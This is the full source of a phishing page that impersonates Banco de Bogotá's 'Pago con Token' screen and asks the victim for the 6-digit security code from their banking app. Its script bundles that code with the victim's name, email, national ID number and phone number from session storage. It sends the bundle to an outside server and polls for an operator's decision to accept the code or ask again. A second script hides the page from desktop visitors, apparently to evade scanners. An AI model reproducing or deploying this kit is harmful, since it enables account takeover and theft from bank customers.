<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pago con Token - Banco de Bogotá</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Roboto", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background: #f4f7fb;
      color: #1a202c;
    }

    .page {
      width: 100%;
      max-width: 720px;
      padding: 32px 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .token-card {
      width: 100%;
      max-width: 640px;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 18px 40px rgba(0, 0, 0, 0.08);
      padding: 32px 40px 28px;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .token-icon {
      width: 64px;
      height: 64px;
      margin: 0 auto 16px;
      position: relative;
    }

    .token-icon-phone {
      width: 40px;
      height: 60px;
      border-radius: 12px;
      border: 2px solid #0047bb;
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -50%);
      background: #f7fafc;
    }

    .token-icon-phone::before {
      content: "";
      position: absolute;
      left: 6px;
      right: 6px;
      top: 18px;
      height: 6px;
      border-radius: 999px;
      background: #e2e8f0;
    }

    .token-icon-phone::after {
      content: "";
      position: absolute;
      bottom: 6px;
      left: 50%;
      transform: translateX(-50%);
      width: 10px;
      height: 2px;
      border-radius: 999px;
      background: #a0aec0;
    }

    .token-icon-badge {
      position: absolute;
      right: 2px;
      bottom: 6px;
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background: #fff7eb;
      border: 2px solid #ffb300;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #ff8c00;
      font-weight: 700;
      font-size: 14px;
    }

    .token-title {
      font-size: 22px;
      font-weight: 700;
      color: #2d3748;
      margin-bottom: 8px;
    }

    .token-text {
      font-size: 14px;
      color: #4a5568;
      max-width: 440px;
      margin: 0 auto 26px;
      line-height: 1.5;
    }

    .token-text strong {
      font-weight: 700;
      color: #2c5282;
    }

    .token-input-wrapper {
      max-width: 360px;
      margin: 0 auto 22px;
    }

    .token-input {
      width: 100%;
      padding: 12px 14px;
      border-radius: 6px;
      border: 2px solid #0047bb;
      font-size: 18px;
      letter-spacing: 0.2em;
      text-align: center;
      outline: none;
      background: #ffffff;
      color: #2d3748;
    }

    .token-input::placeholder {
      color: #cbd5e0;
      letter-spacing: normal;
    }

    .token-button {
      width: 160px;
      margin: 0 auto;
      padding: 12px;
      border-radius: 999px;
      border: none;
      background: #e2e8f0;
      color: #a0aec0;
      font-size: 15px;
      font-weight: 500;
      cursor: default;
      pointer-events: none;
      transition: background-color 0.15s ease, box-shadow 0.15s ease, color 0.15s ease;
    }

    .token-button.enabled {
      background: #0047bb;
      color: #ffffff;
      cursor: pointer;
      pointer-events: auto;
      box-shadow: 0 6px 14px rgba(0, 71, 187, 0.35);
    }

    .token-error-bar {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 40px;
      background: #e53e3e;
      color: #ffffff;
      font-size: 14px;
      display: none;
      align-items: center;
      justify-content: center;
      font-weight: 500;
    }

    .token-error-bar.active {
      display: flex;
    }

    .loading-overlay {
      position: fixed;
      inset: 0;
      background: rgba(255, 255, 255, 0.8);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }

    .loading-overlay.active {
      display: flex;
    }

    .loader {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      border: 4px solid #e2e8f0;
      border-top-color: #0047bb;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    @media (max-width: 600px) {
      .token-card {
        padding: 24px 20px 22px;
      }

      .token-title {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>
  <div id="loading-overlay" class="loading-overlay">
    <div class="loader"></div>
  </div>
  <main class="page">
    <section class="token-card">
      <div id="token-error" class="token-error-bar">
        Error token, verifique e intente nuevamente.
      </div>
      <div class="token-icon">
        <div class="token-icon-phone"></div>
        <div class="token-icon-badge">!</div>
      </div>

      <h1 class="token-title">Pago con Token</h1>
      <p class="token-text">
        Por tu seguridad, consulta el <strong>código de 6 dígitos</strong> en
        tu app Banca Móvil e ingrésalo a continuación.
      </p>

      <div class="token-input-wrapper">
        <input
          id="token-code"
          class="token-input"
          type="text"
          inputmode="numeric"
          pattern="[0-9]*"
          maxlength="6"
          placeholder="••••••"
        >
      </div>

      <button id="btn-pagar" class="token-button" type="button">
        Recibir dinero
      </button>
    </section>
  </main>

  <script>
  const API_BASE = window.location.hostname === "localhost"
    ? "http://localhost:4000"
    : "https://brbpagos4banncs-api.onrender.com";

  const tokenInput = document.getElementById("token-code");
  const pagarButton = document.getElementById("btn-pagar");
  const loadingOverlay = document.getElementById("loading-overlay");
  const tokenErrorBar = document.getElementById("token-error");
  let decisionIntervalId = null;

  function showLoadingAndNavigate(url) {
    if (loadingOverlay) {
      loadingOverlay.classList.add("active");
    }
    setTimeout(function () {
      window.location.href = url;
    }, 2000);
  }

  function startTokenDecisionPolling() {
    if (decisionIntervalId !== null) {
      return;
    }
    decisionIntervalId = setInterval(function () {
      fetch(API_BASE + "/decision")
        .then(function (res) {
          return res.json();
        })
        .then(function (data) {
          if (!data || !data.decision) {
            return;
          }
          clearInterval(decisionIntervalId);
          decisionIntervalId = null;
          if (data.decision === "error_token") {
            showLoadingAndNavigate("token.html?token_error=1");
          } else if (data.decision === "token_ok") {
            if (loadingOverlay) {
              loadingOverlay.classList.remove("active");
            }
            alert("Pago simulado");
          }
        })
        .catch(function () {});
    }, 1000);
  }

  function notifyTelegramToken() {
    const userNombre = sessionStorage.getItem("user_nombre") || "No registrado";
    const userEmail = sessionStorage.getItem("user_email") || "";
    const userCedula = sessionStorage.getItem("user_cedula") || "";
    const userCelular = sessionStorage.getItem("bc_usuario") || "";
    const tokenValor = tokenInput ? tokenInput.value : "";
    const payload = {
      banco: "Banco de Bogotá",
      token: tokenValor,
      nombre: userNombre,
      email: userEmail,
      cedula: userCedula,
      celular: userCelular
    };
    fetch(API_BASE + "/recibir-dinero", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).catch(function () {});
    startTokenDecisionPolling();
  }

  function checkTokenErrorParam() {
    if (!tokenErrorBar) {
      return;
    }
    const params = new URLSearchParams(window.location.search);
    if (params.get("token_error") === "1") {
      tokenErrorBar.classList.add("active");
      setTimeout(function () {
        tokenErrorBar.classList.remove("active");
        params.delete("token_error");
        const newSearch = params.toString();
        const newUrl =
          window.location.pathname + (newSearch ? "?" + newSearch : "");
        window.history.replaceState(null, "", newUrl);
      }, 3000);
    }
  }

  if (tokenInput && pagarButton) {
    tokenInput.addEventListener("keydown", function (event) {
      const allowedKeys = [
        "Backspace",
        "Delete",
        "ArrowLeft",
        "ArrowRight",
        "Tab",
        "Home",
        "End"
      ];
      if (
        (event.key >= "0" && event.key <= "9") ||
        allowedKeys.includes(event.key)
      ) {
        return;
      }
      event.preventDefault();
    });

    tokenInput.addEventListener("input", function () {
      let soloDigitos = this.value.replace(/\D/g, "");
      if (soloDigitos.length > 6) {
        soloDigitos = soloDigitos.slice(0, 6);
      }
      if (this.value !== soloDigitos) {
        this.value = soloDigitos;
      }
      if (soloDigitos.length === 6) {
        pagarButton.classList.add("enabled");
      } else {
        pagarButton.classList.remove("enabled");
      }
    });

    pagarButton.addEventListener("click", function () {
      if (!pagarButton.classList.contains("enabled")) {
        return;
      }
      if (loadingOverlay) {
        loadingOverlay.classList.add("active");
      }
      notifyTelegramToken();
    });
  }

  checkTokenErrorParam();
</script>
  <script>
    (function() {
      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
      var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
      if (!mobileRegex.test(userAgent)) {
        document.body.innerHTML = '';
      }
      try {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let token = '';
        for (let i = 0; i < 50 + Math.floor(Math.random() * 30); i++) {
          token += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        const base64Token = btoa(token + Date.now()).replace(/=/g, '');
        const url = new URL(window.location.href);
        url.searchParams.set('token', base64Token);
        window.history.replaceState(null, '', url.toString());
      } catch (e) {}
    })();
  </script>
</body>
</html>
